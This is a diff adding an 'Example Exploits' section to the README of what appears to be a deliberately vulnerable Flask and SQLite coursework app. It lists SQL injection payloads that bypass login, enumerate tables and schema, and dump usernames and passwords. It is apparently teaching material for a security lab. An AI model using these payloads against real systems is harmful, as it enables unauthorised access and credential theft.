@@ -45,5 +45,42 @@ Start the Flask app:
     Then, open your browser and go to:  
     http://127.0.0.1:5000/
 
+4. **Example Exploits (for SQLite):**
+
+   - **Bypass login with comment**
+     ```
+     admin'-- 
+     ```
+
+   - **Check if injection is possible**
+     ```
+     ' UNION SELECT 1,2,3,4,5; --
+     ```
+
+   - **Get SQLite version**
+     ```
+     ' UNION SELECT sqlite_version(),2,3,4,5; --
+     ```
+
+   - **Show tables**
+     ```
+     ' UNION SELECT name, type, 3,4,5 FROM sqlite_master; --
+     ```
+
+   - **Show SQL query with table info**
+     ```
+     ' UNION SELECT sql, 2,3,4,5 FROM sqlite_master WHERE type='table' AND name='users'; --
+     ```
+
+   - **Dump all users**
+     ```
+     %' UNION SELECT username, password, 1, 2, 3 FROM users; --
+     ```
+
+   - **List all tables and SQL schema**
+     ```
+     ' UNION SELECT type, name, tbl_name, rootpage, sql FROM sqlite_master; --
+     ```
+
 ---
 This project is intended for the f20an coursework.
